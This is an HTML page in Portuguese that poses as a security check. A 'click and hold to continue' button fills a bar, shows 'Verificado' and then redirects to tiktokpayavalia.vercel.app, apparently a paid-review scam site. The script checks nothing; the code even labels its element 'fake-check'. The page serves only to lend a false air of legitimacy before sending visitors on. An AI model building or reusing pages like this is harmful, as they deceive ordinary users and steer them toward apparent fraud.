<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
  <title>Verificação</title>

  <style>
    * {
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      min-height: 100%;
      font-family: Arial, sans-serif;
      background: #f3f3f3;
    }

  body {
  margin: 0;
  height: 100dvh; /* melhor que 100vh no mobile */
  display: flex;
  justify-content: center;
  align-items: center;
  background: #f3f3f3;
  font-family: Arial, sans-serif;
}
    }

    .container {
  width: 100%;
  display: flex;
  justify-content: center;
  align-items: center;
}

    .box {
      width: 100%;
      max-width: 360px;
      background: #fff;
      border: 1px solid #e6e6e6;
      border-radius: 12px;
      box-shadow: 0 4px 14px rgba(0,0,0,0.06);
      padding: 18px 16px 16px;
    }

    

    .verify-text {
      font-size: 15px;
      color: #111;
      line-height: 1.3;
      flex: 1;
      text-align: left;
    }

    .security {
      display: flex;
      align-items: center;
      gap: 5px;
      color: #8a8a8a;
      font-size: 10px;
      white-space: nowrap;
      margin-left: 8px;
    }

    .security svg {
      width: 12px;
      height: 12px;
      display: block;
    }

    .hold-button {
      position: relative;
      width: 100%;
      margin-top: 14px;
      min-height: 52px;
      border: none;
      border-radius: 10px;
      background: #e8e8e8;
      color: #6a6a6a;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      overflow: hidden;
      touch-action: manipulation;
      user-select: none;
      -webkit-user-select: none;
    }

    .hold-progress {
      position: absolute;
      left: 0;
      top: 0;
      width: 0%;
      height: 100%;
      background: #F22B54;
      transition: width 0.05s linear;
      z-index: 0;
    }

    .hold-text {
      position: relative;
      z-index: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 52px;
      padding: 0 14px;
    }

    .footer {
      margin-top: 14px;
      text-align: center;
      font-size: 12px;
      color: #8d8d8d;
      line-height: 1.4;
    }

    @media (max-width: 480px) {
      body {
        padding: 18px 12px;
      }

      .box {
        max-width: 100%;
        padding: 14px;
        border-radius: 12px;
      }

    

      .verify-text {
        font-size: 14px;
      }

      .security {
        font-size: 9px;
        gap: 4px;
      }

      .hold-button {
        min-height: 50px;
        font-size: 15px;
      }

      .hold-text {
        min-height: 50px;
      }

      .footer {
        font-size: 11px;
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="box">

      <div class="verify-card">
        <div class="fake-check"></div>

        <div class="verify-text">
          
        </div>

        

      <button class="hold-button" id="holdBtn">
        <div class="hold-progress" id="progress"></div>
        <div class="hold-text" id="holdText">Clique e segure para continuar</div>
      </button>

      <div class="footer">
        Estamos protegendo sua experiência.
      </div>

    </div>
  </div>

  <script>
    const button = document.getElementById("holdBtn");
    const progress = document.getElementById("progress");
    const holdText = document.getElementById("holdText");

    const redirectURL = "https://tiktokpayavalia.vercel.app/";
    const duration = 2000;

    let timer = null;
    let width = 0;
    let isHolding = false;

    function startHold(e) {
      e.preventDefault();
      if (isHolding) return;

      isHolding = true;
      width = 0;
      progress.style.width = "0%";
      holdText.textContent = "Segure...";

      timer = setInterval(() => {
        width += 100 / (duration / 50);
        progress.style.width = width + "%";

        if (width >= 100) {
          clearInterval(timer);
          holdText.textContent = "Verificado";
          window.location.href = redirectURL;
        }
      }, 50);
    }

    function resetHold() {
      if (!isHolding) return;

      isHolding = false;
      clearInterval(timer);
      timer = null;
      width = 0;
      progress.style.width = "0%";
      holdText.textContent = "Clique e segure para continuar";
    }

    button.addEventListener("mousedown", startHold);
    button.addEventListener("mouseup", resetHold);
    button.addEventListener("mouseleave", resetHold);

    button.addEventListener("touchstart", startHold, { passive: false });
    button.addEventListener("touchend", resetHold);
    button.addEventListener("touchcancel", resetHold);
  </script>

</body>
</html>
